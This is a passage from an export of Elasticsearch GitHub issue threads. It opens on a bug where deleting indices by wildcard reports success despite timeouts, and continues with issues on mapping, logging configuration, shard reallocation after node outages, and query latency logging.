{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
hey-1
hey-10
hey-11
hey-12
hey-13
hey-14
hey-15
hey-16
hey-17
hey-18
hey-19
hey-2
hey-20
hey-21
hey-22
hey-23
hey-24
hey-25
hey-3
hey-4
hey-5
hey-6
hey-7
hey-8
hey-9
{
  "acknowledged" : true
}
health status index  pri rep docs.count docs.deleted store.size pri.store.size
yellow open   hey-16   5   1          0            0       812b           575b
yellow open   hey-17   5   1          0            0       575b           575b
yellow open   hey-18   5   1          0            0       575b           575b
yellow open   hey-19   5   1          0            0       575b           575b
yellow open   hey-20   5   1          0            0       575b           575b
yellow open   hey-21   5   1          0            0       575b           575b
yellow open   hey-22   5   1          0            0       575b           575b
yellow open   hey-23   5   1          0            0       575b           575b
yellow open   hey-24   5   1          0            0       575b           575b
yellow open   hey-25   5   1          0            0       575b           575b
```

Same, but removing with wildcard:

```
# for i in {1..25}; do curl -s -X PUT http://web245:9200/hey-$i?pretty; done &amp;&amp; sleep 10 &amp;&amp; curl -s 'http://web245:9200/_cat/indices/hey-*?h=index' | sort &amp;&amp; curl -s -X DELETE http://web245:9200/hey-*?pretty &amp;&amp; curl -s 'http://web245:9200/_cat/indices/hey-*?v=index' | sort
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
{
  "acknowledged" : true
}
hey-1
hey-10
hey-11
hey-12
hey-13
hey-14
hey-15
hey-16
hey-17
hey-18
hey-19
hey-2
hey-20
hey-21
hey-22
hey-23
hey-24
hey-25
hey-3
hey-4
hey-5
hey-6
hey-7
hey-8
hey-9
{
  "acknowledged" : true
}
green  open   hey-15   5   1          0            0       970b           575b
green  open   hey-16   5   1          0            0       970b           575b
green  open   hey-17   5   1          0            0       970b           575b
health status index  pri rep docs.count docs.deleted store.size pri.store.size
yellow open   hey-10   5   1          0            0       891b           575b
yellow open   hey-11   5   1          0            0       891b           575b
yellow open   hey-12   5   1          0            0       891b           575b
yellow open   hey-13   5   1          0            0       891b           575b
yellow open   hey-14   5   1          0            0       891b           575b
```

I'm on 1.4.1
</comment><comment author="bobrik" created="2014-12-02T17:47:57Z" id="65272465">Logs are here:

```
[2014-12-02 21:08:52,701][DEBUG][action.admin.indices.delete] [statistics04] [hey-15] failed to delete index
org.elasticsearch.cluster.metadata.ProcessClusterEventTimeoutException: failed to process cluster event (delete-index [hey-15]) within 30s
    at org.elasticsearch.cluster.service.InternalClusterService$2$1.run(InternalClusterService.java:263)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:722)
[2014-12-02 21:08:52,701][DEBUG][action.admin.indices.delete] [statistics04] [hey-14] failed to delete index
org.elasticsearch.cluster.metadata.ProcessClusterEventTimeoutException: failed to process cluster event (delete-index [hey-14]) within 30s
    at org.elasticsearch.cluster.service.InternalClusterService$2$1.run(InternalClusterService.java:263)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:722)
```

This is probably not the best idea to tell user that index is deleted when it is not.
</comment><comment author="clintongormley" created="2014-12-02T18:15:00Z" id="65276810">I could replicate this in master by starting two nodes, then running this shell script:

```
for i in {1..50}; do curl -s -X PUT http://localhost:9200/hey-$i?pretty; done &amp;&amp; sleep 3 &amp;&amp; curl -s 'http://localhost:9200/_cat/indices/hey-*?h=index' | sort &amp;&amp; curl -s -X DELETE 'http://localhost:9200/hey-*?master_timeout=1s&amp;pretty' &amp;&amp; echo "DONE"  &amp;&amp; curl -s 'http://localhost:9200/_cat/indices/hey-*?v=index' | sort
```

In the logs were lines like:

```
[2014-12-02 19:07:22,183][DEBUG][action.admin.indices.delete] [Hephaestus] [hey-34] failed to delete index org.elasticsearch.cluster.metadata.ProcessClusterEventTimeoutException: failed to process cluster event (delete-index [hey-34]) within 1s
at org.elasticsearch.cluster.service.InternalClusterService$2$1.run(InternalClusterService.java:275)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
at java.lang.Thread.run(Thread.java:722)
```

The `delete` request returns `acknowledged: true` even though not all matched indices have been deleted.  Not sure what the right thing to do here is.
</comment><comment author="bobrik" created="2014-12-02T18:20:01Z" id="65277586">Will it return an error if only one index was requested and removal is timed out? What if I pass two indices and both timed out?

I think it's better to return an error so clients can implement logic that is sane for them.
</comment><comment author="javanna" created="2015-03-22T17:34:27Z" id="84662985">I had a look at this, I see the problem and I will work on fixing it. It all boils down to how delete index works internally. One cluster state update per index gets processed by `TransportDeleteIndexAction`, which tends to "forget" about previous indices failures. If the last delete index task succeeds, a positive response is returned, whereas if the last delete index task fails (or times out), then a failure is returned. This is bad :(  I am on it
</comment><comment author="yodog" created="2015-03-31T15:38:59Z" id="88137113">also happens with `curl -XDELETE 'http://localhost:9200/_all'`
</comment><comment author="javanna" created="2015-09-03T18:22:00Z" id="137534022">This issue will be solved when we get #11189 in, which is a good fix but needs a proper test written for it. With that fix we will return a reliable last failure at least. That said #11258 (or something along those lines) would improve things even better, as it would treat the request as a single cluster state update task. The annoying part in fact is that we have one single failure in the response at the moment, but that's only the last failure, while we could have more potentially.
</comment><comment author="javanna" created="2015-10-27T15:14:29Z" id="151536494">Fixed via #11258 . Closing
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Some PercolateRequest "setters" allow for method chaining, some don't</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7294</link><project id="" key="" /><description>Closes #7294
</description><key id="40349652">7294</key><summary>Some PercolateRequest "setters" allow for method chaining, some don't</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Java API</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-15T13:56:39Z</created><updated>2015-06-07T12:23:23Z</updated><resolved>2014-08-15T13:59:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>_ttl: enabled: false has no effect</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7293</link><project id="" key="" /><description>(Updated - my first examples were wrong)

In the following example the document will be deleted:

```
DELETE testidx
PUT testidx
PUT testidx/doc/_mapping
{
  "_ttl":{
    "enabled": "true"
  }
}

GET testidx/_mapping


PUT testidx/doc/_mapping
{
  "_ttl":{
    "enabled": "false"
  }
}
# _ttl is enabled anyway
GET testidx/_mapping
POST testidx/doc/1
{
  "text":"foo",
  "_ttl": "10ms"
}

#document will be deleted after a while
GET testidx/doc/1
```
</description><key id="40344606">7293</key><summary>_ttl: enabled: false has no effect</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">brwe</reporter><labels /><created>2014-08-15T12:38:13Z</created><updated>2014-08-18T15:07:37Z</updated><resolved>2014-08-18T09:32:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-18T09:20:19Z" id="52469170">@brwe Isn't this a duplicate of #777?
</comment><comment author="brwe" created="2014-08-18T09:32:09Z" id="52470195">When I opened the issue it was not clear to me if one should be allowed to disable `_ttl` dynamically. After reading more code I think it should not be possible so yes, a duplicate of #777.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Docs: Fix ambigous explanation of the "fields" parameter in `query_strin...</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7292</link><project id="" key="" /><description>...g` query
</description><key id="40343697">7292</key><summary>Docs: Fix ambigous explanation of the "fields" parameter in `query_strin...</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">brwe</reporter><labels><label>docs</label></labels><created>2014-08-15T12:20:29Z</created><updated>2014-08-18T11:07:30Z</updated><resolved>2014-08-18T11:07:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Feature: Ability to set logging configuration on startup</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7291</link><project id="" key="" /><description>Currently, there is a parameter called es.config which sets the full path (including filename) to the elasticsearch config file. This is convenient when setting up multiple instances of ES on the same machine. It would be nice to have a logging equivalent (e.g. es.loggingConfig) to do the same for logging.yml (e.g. 

es.config=/etc/elasticsearch/es_master1.yml
es.loggingConfig = /etc/elasticsearch/es_master1_logging.yml

I know a current workaround is to set the configuration path to be something unique like /etc/elasticsearch/es_master1/ and then place your 'independent' configs in there.
</description><key id="40335725">7291</key><summary>Feature: Ability to set logging configuration on startup</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">derryos</reporter><labels><label>discuss</label></labels><created>2014-08-15T09:45:22Z</created><updated>2014-10-31T11:24:55Z</updated><resolved>2014-10-31T11:24:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="erikringsmuth" created="2014-09-04T19:30:48Z" id="54531805">I was wondering the same thing. We can configure the location of `elasticsearch.yml` with this.

```
-Des.config=/config/elasticsearch-custom.yml
```

http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/setup-configuration.html#styles

Or set the config folder which will also change the `logging.yml` folder.

```
path.conf: /config
```

But we don't have a way of directly setting `logging.yml`.

```
-Des.logging.config=/config/logging-custom.yml
```
</comment><comment author="clintongormley" created="2014-10-31T11:24:54Z" id="61247660">Closing in favour of #6766 - make all of these hardcoded locations configurable.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Allows all options for expand_wildcards parameter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7290</link><project id="" key="" /><description>This change means that the default settings for expand_wildcards are only applied if the expand_wildcards parameter is not specified rather than being set upfront. It also adds the none and all options to the parameter to allow the user to specify no expansion and expansion to all indexes (equivalent to 'open,closed')

Closes #7258
</description><key id="40332005">7290</key><summary>Allows all options for expand_wildcards parameter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:REST</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-15T08:36:53Z</created><updated>2015-06-07T19:07:35Z</updated><resolved>2014-08-15T11:52:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-08-15T08:53:39Z" id="52286697">LGTM, can you please check that we have tests for these two cases, I'm afraid we've only used either open or open and closed in your current tests.
</comment><comment author="colings86" created="2014-08-15T10:19:29Z" id="52292613">@javanna I added a set of REST tests for the get mapping API which test the options from the rest layer and also added tests to MetaDataTests to test the functionality on the Java layer
</comment><comment author="javanna" created="2014-08-15T10:23:55Z" id="52292891">Left a small comment, other than that looks great
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Refactor guice startup</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7289</link><project id="" key="" /><description>- Removed &amp; refactored unused module code
- Allowed to set transports programmatically

Note: The current implementation breaks BWC as you need to specify a concrete
transport now instead of a module if you want to use a different
Transport or HttpServerTransport
</description><key id="40330658">7289</key><summary>Refactor guice startup</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>:Internal</label><label>breaking</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-15T08:08:05Z</created><updated>2015-06-06T16:39:42Z</updated><resolved>2014-08-19T16:04:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="uboness" created="2014-08-15T08:22:30Z" id="52284578">left a couple of comment, besides that LGTM
</comment><comment author="spinscale" created="2014-08-15T10:49:33Z" id="52294537">added logging in all three cases as well forcing the user to specify the plugin responsible for the change
</comment><comment author="spinscale" created="2014-08-18T08:00:01Z" id="52462162">switched back to use a string instead of a plugin as argument
</comment><comment author="uboness" created="2014-08-18T13:09:51Z" id="52489257">LGTM
</comment><comment author="uboness" created="2014-08-18T20:54:07Z" id="52553522">why is this labeled as breaking?
</comment><comment author="spinscale" created="2014-08-19T12:39:23Z" id="52626885">@uboness change of the transport implementation does not require you to specify a module any more but the conrete transport, using the settings key `http.type` and `transport.type`, so upgrading requires a config change
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add option to prevent recovering replica shards onto nodes that did not have them locally.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7288</link><project id="" key="" /><description>For large deployments ES shard recovery after a node goes down or some networking event occurs seems to cause more problems than are necessary because all of the shards end up getting shuffled around the cluster and can cause other performance problems. Seems better to leave some replicas uninitialized until the nodes are alive again. Right now the recovery time from an event affecting a node is proportional to the total amount of data on that node rather than proportional to the amount of changed data on that node if we just waited for the node to be up again so it can recover locally. This behavior also makes it harder to contain a problem from affecting the entire cluster.
## Backstory

We had a 4 min network disruption in one of our 3 data centers (14 data nodes per DC) at 23:04. As you would expect ES queries started timing out to that DC giving us a 30% error rate, but then recovered after about 5 minutes.

![](https://i.cloudup.com/0EhM4BnqMu.png)

However, after about 30 minutes queries again started timing out and that continued to get worse over the next two hours.

The root cause of these bad queries was due to shards getting shuffled around within the DC that had the networking problem.

![](https://i.cloudup.com/8mbgBq1PQt.png)

Some nodes actually ended up getting overloaded with shards causing server performance problems as the shards got initialized on those nodes and they could not handle the increasing query load (those first 14 bars are disk space in the affected DC):

![](https://i.cloudup.com/DBVZ2plrzV-3000x3000.png)
## Proposed Solution

I think a better set of "production" settings would say "do not re-allocate shards to other nodes when a node goes down".

It seems like cluster.routing.allocation.enable should have an additional option: recovery_and_new (this would still allow rebalancing). "Recovery" in this case would mean that shards can only be initialized on a node that already had them on it. 

The assumption here is that the cluster has enough replication that losing a single replica is not such a large event that it is worth triggering a whole lot of network traffic and potentially causing other problems.
## Other Workarounds

I don't think there is a way to do this right now. I could disable all allocation, but that would prevent shards for new indices from being allocated. recover_after_time could almost serve this purpose (I could set the timeout to 3 hours to give the ops team time to get a server back up), but that setting seems to only apply on a full cluster restart.
</description><key id="40304191">7288</key><summary>Add option to prevent recovering replica shards onto nodes that did not have them locally.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">gibrown</reporter><labels><label>:Allocation</label></labels><created>2014-08-14T21:59:43Z</created><updated>2015-08-17T14:46:54Z</updated><resolved>2015-08-16T10:44:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dakrone" created="2014-08-25T08:40:54Z" id="53240430">@gibrown this sounds useful, but I think using the term "recovery" has too much baggage for this. Maybe naming it something like "existing" would be better suited (not 100% sure about the name).

So maybe "existing_and_new" would allow existing replicas to be recovered and brand new shards to be allocated, but not recovering replicas if a node went down. Does this sound like what you're after?

This does sound good, it sounds similar to (but not the same as) another issue (which I can't find right now) that has a "recover_after_time" setting for shard recovery, so you could say "wait 5 minutes after losing a replica before trying to recover it to another machine".
</comment><comment author="bleskes" created="2014-08-25T09:09:20Z" id="53242776">@gibrown It seems you havea  deployment where a single datacenter is not capable of hosting more then one copy of the data. I wonder if force awareness  ( http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-cluster.html#forced-awareness ) , where you use the datacenter as  the attribute, in combination with `gateway.expected_nodes` for full cluster restart. This will make sure only one replica will be assigned to each datacenter, but if a node goes down within a data center another node in the same DC will pick up the missing replica. 
</comment><comment author="gibrown" created="2014-08-25T16:41:32Z" id="53289445">@dakrone "existing_and_new" sounds much better, and exactly like what I'm after. I thought about suggesting a timeout to control this. I think its hard to decide what I'd set the time to though. If nodes aren't coming back up after some period of time, there is probably a reason that our ops team is well aware of. Having the system suddenly try to correct itself is more likely to exacerbate the problem IMO.

@bleskes We do use a DC awareness attribute, but also have a secondary attribute ("parity" which indicates which is tied to the network router in the rack) so we can have multiple replicas in one DC. In practice we see the replicas getting reallocated on another node in the same DC (presumably due to the DC attribute being higher priority). Ideally though, I don't want the replica moved at all. If a DC is having problems, moving TBs of data around does not help.
</comment><comment author="sax" created="2014-08-27T18:29:14Z" id="53618688">@gibrown we have a much smaller cluster than you, but are running into similar issues.

Have you tried setting `index.routing.allocation.total_shards_per_node`? We're thinking that if we set this to the exact number of shards expected per node in a healthy state (with all nodes available), then when nodes go down shards will not be reallocated. If multiple nodes become unavailable, this may leave the cluster in a red state; we are already catching this in our client applications and disabling associated features for users.
</comment><comment author="nik9000" created="2014-08-27T18:50:29Z" id="53621824">I think there are some things we can do that aren't as aggressive as not allowing reallocation on nodes that don't already have some of the index.  That might still be a good idea but it isn't one I'm likely to use.

When a node goes down all the shards that it hosted are shifted to "unassigned" state.  Right now when the allocation algorithm for unassigned shards tries to assign them as quickly as possible.  It makes some effort to balance them while it is allocating them but if the most balanced node is throttled then it'll just assign the shard to the next most balanced node.  This causes it to assign all the shards super fast (good) but it can make the cluster quite unbalanced (bad).

Maybe instead we need a way to be more leisurely and balanced when assigning shards.  So we only assign the shard to the node that would be most balanced and if that node is throttled then we just give up on assigning that shard for now and come back to it when the node isn't throttled.  I don't think you want to do this if there aren't any replicas live, but if you already have a single replica and you are just looking to add another then maybe its ok.

I think this would have prevented your massive shuffling problem.  I think.
</comment><comment author="sax" created="2014-08-27T18:55:05Z" id="53622503">@gibrown we just tried this and it appears to do what we expected. When we restarted an individual node, the shards on that node became unassigned. When the node rejoined the cluster, those shards were allocated back to it, and it was able to recover quickly from the shards already on disk (and in the disk cache).
</comment><comment author="gibrown" created="2014-08-27T19:14:26Z" id="53625310">@sax that's a good workaround that I hadn't considered. 

I don't think it works for my use case because we use index templates to auto create new indices, and on one of our clusters we are fairly constantly adding new indices (and hence shards).
</comment><comment author="sax" created="2014-08-27T19:35:42Z" id="53628032">I'll double check, but I thought it was set per index.

Sent from my iPhone

On Aug 27, 2014, at 12:14 PM, Greg Ichneumon Brown notifications@github.com
wrote:

@sax https://github.com/sax that's a good workaround that I hadn't
considered.

I don't think it works for my use case because we use index templates to
auto create new indices, and on one of our clusters we are fairly
constantly adding new indices (and hence shards).

&#8212;
Reply to this email directly or view it on GitHub
https://github.com/elasticsearch/elasticsearch/issues/7288#issuecomment-53625310
.
</comment><comment author="gibrown" created="2014-08-27T19:37:59Z" id="53628368">@nik9000 a smarter allocation algorithm would help for some use cases, but I think would also make the dynamics more complex and confusing. I'd prefer the system to be more predictable.

For our use case reusing the 2TB of data that is already on the disks of each node is almost always the fastest way to get our replicas back. Moving shards around will always be MUCH slower. Even if it takes hours to resolve a hardware problem, moving shards is often an event that takes 24-36 hours to complete. I'd rather intentionally decide to move that much data around.

In those cases where we do choose to move the data around though, I agree that paying more attention to the overall balance of shards would help.
</comment><comment author="gibrown" created="2014-08-27T19:54:32Z" id="53630711">@sax oh you're totally right.

Still wouldn't be my preferred way to manage this, but does seem to be a good workaround.
</comment><comment author="sax" created="2014-08-27T20:03:33Z" id="53632129">@gibrown agreed. I think we have a host of other tuning issues, but at least this will simplify the way we restart nodes until there's a better option.
</comment><comment author="sax" created="2014-08-27T20:13:14Z" id="53633460">@nik9000 I think there are two competing priorities for us. One is the ability to do a rolling restart of a cluster as quickly as possible. The other is to tune recovery such that it does not cause the cluster to become unavailable. Since we're struggling mightily with the latter, being able to solve the former in a very simple fashion is nice.

Ideally there would be another way of configuring recovery timeouts, where you could tell the cluster to allow shards to remain unassigned for some time period. If a node rejoins the cluster, then expected_nodes would be met and the missing shards could be reassigned back (where they could be loaded from disk). After some timeout, however, the unassigned shards would be allocated to different nodes for redundancy.

Pardon if this is what is described above, my brain is spinning a bit trying to keep all the bits in.
</comment><comment author="nik9000" created="2014-08-27T20:18:50Z" id="53634207">@sax - what I was describing was more a way to prevent the cluster from becoming super unbalanced when it comes back up - a timeout would help, I think.

Maybe something like this:
- If there aren't any replicas online then try to assign the shard as fast as possible just like how it works now.
- If there are replicas online then wait some specified timeout hoping the node will come back.  If it comes back then restore wherever would be most efficient/balanced.  Hopefully that node is the one that just came back.  If the node is already throttled then wait for it to become unthrottled.

I think it'd make make a single node going down less exciting.
</comment><comment author="nik9000" created="2014-08-27T20:21:04Z" id="53634503">It'd change rolling restarts too.  I'm not sure if it'd help them or hurt them.  Ultimately I think full cluster restarts are a lost cause until we have a way to restore from the master shard's translog even if the files differ.
</comment><comment author="dakrone" created="2014-08-28T08:38:32Z" id="53688227">&gt; Ultimately I think full cluster restarts are a lost cause until we have a way to restore from the master shard's translog even if the files differ.

Yes, unfortunately this is something that will require sequence numbers, which we're working on, but until then a super-fast recovery after full restart (without pre-optimizing and changing replica settings) is not possible.
</comment><comment author="clintongormley" created="2014-09-06T13:25:28Z" id="54712221">Stalled by #6069
</comment><comment author="gibrown" created="2014-09-09T04:15:02Z" id="54922290">@clintongormley wasn't @dakrone's comment about only full cluster restarts requiring sequence numbers? I would think for implementing 'existing_and_new' as an additional option for the cluster.routing.allocation.enable would be independent of the translog.
</comment><comment author="clintongormley" created="2014-09-09T12:56:11Z" id="54964287">@gibrown No, even a node restart will benefit from sequence numbers.  Imagine that you have a primary on one node and a replica on the other.  You keep indexing documents, refreshes happen at different times on primary and replica, so the segments diverge.  Now the node with the replica disappears temporarily (eg network disconnect or node restart). 

To ensure that the primary is in sync with the replica, we can compare segments and copy over all of the segments that the primary has and the replica doesn't.  But these segments have diverged over time, so this can end up being a lot of data.  With sequence numbers the situation is different.  As long as the last sequence number that the replica knows about is still in the transaction log of the primary, we can just replay the translog from that point on.
</comment><comment author="gibrown" created="2014-09-09T17:22:16Z" id="55004623">Right, I see how they can help restart times in lots of scenarios, and I'm all for it and agree sequence numbers would be a huge improvement. But I don't think they address the original problem of large shards being moved from a node that is temporarily down but then returns from production.

If shard A is on node 1, and node 1 goes down due to a hardware failure, then shard A is going to get reallocated on another node that has no data and all the data needs to be copied over the network. I would much rather have the reduced redundancy until our ops team resolves the hardware failure and node 1 comes back up than have TBs of data moving around the cluster exacerbating the problems that already exist in the cluster.

I would think this problem is orthogonal to sequence numbers, but its quite likely I'm misunderstanding something.
</comment><comment author="s1monw" created="2014-10-23T12:13:38Z" id="60229747">just as a side note I just pushed #8190 to master which might help here as well @gibrown 
</comment><comment author="clintongormley" created="2015-08-16T10:44:32Z" id="131523316">This is now closed by #11438, #12421, and #11417
</comment><comment author="gibrown" created="2015-08-17T14:46:54Z" id="131847694">@clintongormley thanks to you and everyone else for these improvements.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add ability to log summary stats for search query with a request id</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7287</link><project id="" key="" /><description>In order to better maintain a elastic search cluster serving several multitenant clients and data load in petabytes scale and to improve search efficiency and indexing capabilities we need to have a historical timelapse view of the following

1) What nodes and shards a particular query will span for gather phase or query phase or gather and query phase for a search query with a request id.

2) The latency information at each shard for a search query with request id.

This information needs to be logged once in a precise and concise manner so that there wouldn't be too much logging overhead and it would also nicely group all the routing and latency information in one log message.

Example logging for search request, for gather then fetch query call flow

{"requestId":1,"phaseOneTargetShards":5,"phaseOneLatencyMillis":3,"phaseOneStats":[{"shardId":"0","nodeId":"37EAely-Tj2JUoShLvB45w","latencyMillis":2},{"shardId":"2","nodeId":"37EAely-Tj2JUoShLvB45w","latencyMillis":2},{"shardId":"1","nodeId":"37EAely-Tj2JUoShLvB45w","latencyMillis":3},{"shardId":"3","nodeId":"37EAely-Tj2JUoShLvB45w","latencyMillis":2},{"shardId":"4","nodeId":"37EAely-Tj2JUoShLvB45w","latencyMillis":3}],"phaseTwoTargetShards":1,"phaseTwoLatencyMillis":1407746692060,"phaseTwoStats":[{"shardId":"1","nodeId":"37EAely-Tj2JUoShLvB45w","latencyMillis":1}]}
</description><key id="40279274">7287</key><summary>Add ability to log summary stats for search query with a request id</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">srimaruti</reporter><labels><label>feedback_needed</label></labels><created>2014-08-14T17:41:18Z</created><updated>2014-12-30T20:31:03Z</updated><resolved>2014-12-30T20:31:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-10-31T11:18:39Z" id="61247132">Hi @srimaruti 

Is the point of this logging to profile particular queries, or to monitor shard health/latency over time?   How do you plan to use this low level information (as opposed to the values exposed via the stats APIs)?

We could potentially add this level of information to the slow query log. 

Of course, logging itself adds overhead.  I'm also wondering if we should look at exposing percentiles in our stats APIs as well as just the totals. 

Would be interested in hearing more about your use case.
</comment><comment author="clintongormley" created="2014-12-30T20:31:03Z" id="68395003">No further info provided. Closing
